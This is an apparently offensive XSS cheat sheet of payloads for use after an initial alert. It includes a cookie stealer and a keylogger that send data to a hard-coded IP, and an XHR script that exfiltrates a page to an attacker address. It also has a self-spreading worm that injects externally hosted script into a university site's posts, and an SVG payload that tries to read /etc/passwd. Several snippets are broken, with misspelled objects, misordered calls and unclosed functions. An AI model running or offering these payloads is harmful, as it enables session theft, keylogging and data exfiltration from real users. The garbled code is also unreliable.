# Beyond alert
Going beyond the alert('xss')

## Info

After getting your xss alert box, what's next? This is not usually enough to "show impact", so on the good stuff!

## Techniques (code)

- Ping back
  ```js
  <script src="http://IP:PORT/"><script>
  ```

- Cookie Stealer
  ```js
  <img src=x onerror=this.src='http://5.5.5.5/?cookie='+document.cookie>
  ```

- Record key stokes

  Add this to a js file
  ```js
  var data = '';
  document.onkeypress = function(e) {
    var w = window.event ? event : e;
    var keystroke = w.keyCode ? w.keyCode : w.charCode;
    keystroke = String.fromCharCode(keystroke);
    data = data + keystroke;
  }
  window.setInterval(function(){
      new Image().src = 'http://5.5.5.5/?c=' + data;
      data = '';
  }, 1500);
  ```
  Then call the script in using xss
  ```js
  http://target.site/welcome.php?user=admin<script src='http://5.5.5.5/keylogger.js'></script>
  ```


## XHR examples

- Simple XHR
  - GET
    ```js
    var xhr = new XHMLHttpRequest();
    xhr.open("GET", "/url", true);
    xhr.send(null);
    ```

  - POST
    ```js
    var xhr = new XHMLHttpRequest();
    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    xhr.open("POST", "/url", true);
    xhr.onreadystatechang = function() {
    if (this.readyState == XMLHttpRequest.DONE && this.status == 200){
    // Request finished do somethiung with data
    }};
    xhr.send(null);
    ```

- GET (a page)
  ```js
  var attackerurl = "http://10.10.14.86:80/";
  var targeturl = "http://ftp.crossfit.htb/accounts/create";

  var req = new XMLHttpRequest();
  req.onreadystatechange = function () {
    if (req.readyState == 4) {
      var req2 = new XMLHttpRequest();
      req2.open("GET", attackerurl + btoa(this.responseText), false);
      req2.send();
    }
  };
  req.open("GET", targeturl, false);
  req.send();
  ```
- GET (eg 2)
  ```js
  function exploit() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/iv/srtpHire_list.do?type=1', true);
    xhr.onreadystatechange = function () {
        if(xhr.readyState === 4 && xhr.status === 200) {
            var html = xhr.responseText;
            var item = new Set();
            while (r = re.exec(html)) {
                item.add(r[1]);
            }
            item = Array.from(item);
            var title = item[Math.floor(item.length*Math.random())];
            commit_proj(title);
        }
    };
    xhr.send(null);
  ```


- POST
  ```js
  function commit_proj(title) {
      var xhr = new XMLHttpRequest();
      var start_date = new Date();
      var end_date = new Date((new Date()).setMinutes(start_date.getDate() + 33));
      start_date = formatDate(start_date);
      end_date = formatDate(end_date);
      xhr.open("POST", '/iv/group_add.do', true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      data = "beginDate=" + start_date;
      data += "&btn1=发布信息";
      data += "&contactNumber=" + Math.floor(Math.random() * 1000000000);
      data += "&detail=西南jio痛大学简直强无敌！"
      data += "&endDate=" + end_date;
      data += "&group.acceptCollegeCode=0&group.contactWay=0&group.sortId=1"
      data += "&theme=" + title;
      data += "&title=" + title + "%3Cscript+src%3D'https%3A%2F%2Fdkmy.ml%2Fswjtu%2Fcxw''%3E%3C%2Fscript%3E"
      xhr.send(data);
  }
  ```

## Images
- SVG Xss
  ```html
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg xmlns="http://www.w3.org/2000/svg">
   <script>
      function readTextFile(file){
         var rawFile = new XMLHttpRequest();
         rawFile.open("GET", file, false);
         rawFile.onreadystatechange = function ()
      {

      if(rawFile.readyState === 4){
         if(rawFile.status === 200 || rawFile.status == 0){
            var allText = rawFile.responseText;
            alert(allText);
         }
      }

     rawFile.send(null);
     readTextFile("file:///../../../../../../../../../etc/passwd");
   </script>
</svg>
```

